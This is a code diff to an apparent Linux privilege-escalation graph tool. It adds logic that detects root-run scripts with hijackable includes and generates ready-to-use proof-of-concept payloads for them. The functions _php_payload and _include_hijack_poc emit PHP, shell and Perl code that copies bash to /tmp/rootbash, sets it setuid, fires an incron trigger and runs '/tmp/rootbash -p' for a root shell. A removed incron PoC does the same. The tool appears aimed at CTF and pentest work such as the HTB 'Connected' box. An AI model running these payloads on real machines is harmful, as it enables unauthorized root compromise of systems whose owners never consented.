@@ -15,7 +15,7 @@ from chainmail.knowledge import groups as groupkb
 from chainmail.graph.model import (
     Edge, Graph, user_node, group_node,
     MEMBERSHIP, SUDO, SUID, CAPABILITY, GROUP_PRIV, WRITABLE_EXEC,
-    PATH_HIJACK, SENSITIVE_WRITE, KERNEL_EXPLOIT,
+    PATH_HIJACK, SENSITIVE_WRITE, KERNEL_EXPLOIT, INCLUDE_HIJACK,
 )
 
 ROOT = "root"
@@ -34,6 +34,7 @@ def build_graph(facts: Facts) -> Graph:
     _add_suid(g, facts, me)
     _add_capabilities(g, facts, me)
     _add_scheduled_writes(g, facts, me)
+    _add_include_hijacks(g, facts, me)
     _add_sensitive_writes(g, facts, me)
     _add_kernel_exploits(g, facts, me)
     return g
@@ -165,27 +166,29 @@ def _add_scheduled_writes(g: Graph, facts: Facts, me: str) -> None:
             continue
         owner = job.owner if job.owner not in ("", "ALL") else ROOT
 
-        # 0) incron: the watched path is the primitive. If we can write it, we
-        # can fire the root-run command (and usually inject into the file it
-        # consumes). This is the HTB "Connected" class of vector.
-        if job.kind == "incron" and job.trigger_path:
+        # 0) incron: the watched path is the *trigger*. Writing it only injects
+        # into a root context when the command actually consumes the watched
+        # file's content/name (incron wildcards $@/$#, or the path appears in
+        # the command). When the command is instead a fixed root helper script
+        # -- the HTB "Connected" case -- the real code-exec comes from a
+        # hijackable include in that script, handled by _add_include_hijacks
+        # (which carries the trigger), so we do NOT emit a misleading root edge
+        # here.
+        if job.kind == "incron" and job.trigger_path and _consumes_watched_file(job):
             t_hit = (writable_index.get(job.trigger_path)
                      or writable_index.get(_parent(job.trigger_path)))
             if t_hit:
                 g.add_edge(Edge(
                     src=_writer_source(t_hit.writable_via, me),
                     dst=user_node(owner), category=WRITABLE_EXEC,
-                    title=f"modify incron-watched path run by {owner}",
+                    title=f"inject via incron-watched file run by {owner}",
                     detail=f"{job.source}: incrond runs '{job.command}' as {owner} "
-                           f"on changes to {job.trigger_path}; writable via "
-                           f"{t_hit.writable_via} ({t_hit.note})",
-                    poc=(f"printf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash; "
-                         f"chmod +sx /tmp/rootbash\\n' > /tmp/x.sh; chmod +x /tmp/x.sh; "
-                         f"echo ';/tmp/x.sh' >> {job.trigger_path}; "
-                         f"touch {job.trigger_path}; sleep 3; /tmp/rootbash -p"),
-                    requires=(f"incrond running; the root command must consume the "
-                              f"watched file's content/name (else the write only "
-                              f"triggers '{job.command}')"),
+                           f"on changes to {job.trigger_path}, and the command "
+                           f"consumes that file; writable via {t_hit.writable_via}",
+                    poc=(f"# command processes the watched file; craft input it will "
+                         f"execute, then:\n"
+                         f"touch {job.trigger_path}  # fires incrond as {owner}"),
+                    requires="incrond running; depends on how the command parses the file",
                 ))
 
         # 1) direct file / parent-dir writability
@@ -306,6 +309,75 @@ def _add_kernel_exploits(g: Graph, facts: Facts, me: str) -> None:
                 f"search Exploit-DB / GitHub for {f.cve}",
             requires=f.requires or "confirm the target is unpatched before relying on this",
         ))
+
+
+def _add_include_hijacks(g: Graph, facts: Facts, me: str) -> None:
+    """Edges for files included/sourced by a root-run script that we control.
+
+    This is the corrected HTB "Connected" model: a root incron helper script
+    require_once()s a PHP file that is missing under a writable directory. We
+    create the include with a malicious class (matching the script's
+    ``new Class()->method()`` call) and fire the trigger.
+    """
+    for h in facts.hijackable_includes:
+        src = _writer_source(h.writable_via, me)
+        verb = "create" if h.state == "missing-writable-parent" else "overwrite"
+        title = f"{verb} {h.language} include used by root script"
+        detail = (f"{h.script_path} (runs as {h.owner} via {h.job_kind} "
+                  f"{h.job_source}) includes {h.include_path}; {h.state} "
+                  f"(writable via {h.writable_via})")
+        if h.invoke_hint:
+            detail += f"; script invokes {h.invoke_hint}"
+        g.add_edge(Edge(
+            src=src, dst=user_node(h.owner), category=INCLUDE_HIJACK,
+            title=title, detail=detail,
+            poc=_include_hijack_poc(h),
+            requires=_include_requires(h),
+        ))
+
+
+def _consumes_watched_file(job) -> bool:
+    """Heuristic: does an incron command actually use the watched file?"""
+    cmd = job.command or ""
+    if any(tok in cmd for tok in ("$@", "$#", "$%", "$&")):
+        return True
+    return bool(job.trigger_path and job.trigger_path in cmd)
+
+
+def _php_payload(invoke_hint: str) -> str:
+    root = "exec('cp /bin/bash /tmp/rootbash'); exec('chmod +s /tmp/rootbash');"
+    if "::" in invoke_hint:
+        cls, meth = invoke_hint.split("::", 1)
+        return (f"<?php class {cls} {{ function {meth}() {{ {root} }} }}")
+    if invoke_hint:                       # class known, method unknown
+        return (f"<?php /* {invoke_hint} */ {root}  "
+                f"// if a method is required, wrap in the class/method the script calls")
+    return f"<?php {root} ?>"             # executed at include time
+
+
+def _include_hijack_poc(h) -> str:
+    steps: list[str] = []
+    if h.state == "missing-writable-parent":
+        steps.append(f"mkdir -p {h.include_path.rsplit('/', 1)[0]}")
+    if h.language == "php":
+        steps.append(f"cat > {h.include_path} <<'PHP'\n{_php_payload(h.invoke_hint)}\nPHP")
+    elif h.language == "shell":
+        steps.append(f"printf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash; "
+                     f"chmod +s /tmp/rootbash\\n' > {h.include_path}")
+    elif h.language == "perl":
+        steps.append(f"echo 'system(\"cp /bin/bash /tmp/rootbash; "
+                     f"chmod +s /tmp/rootbash\"); 1;' > {h.include_path}")
+    if h.job_kind == "incron" and h.trigger_path:
+        steps.append(f"echo trigger > {h.trigger_path}   # fire incrond as {h.owner}")
+    steps.append("sleep 3; /tmp/rootbash -p   # then: id")
+    return "\n".join(steps)
+
+
+def _include_requires(h) -> str:
+    if h.job_kind == "incron" and h.trigger_path:
+        return (f"incrond running; create the include BEFORE firing "
+                f"{h.trigger_path}; confirm the script reaches the include")
+    return f"{h.job_kind or 'job'} must run {h.script_path}"
 
 
 # --------------------------------------------------------------------------
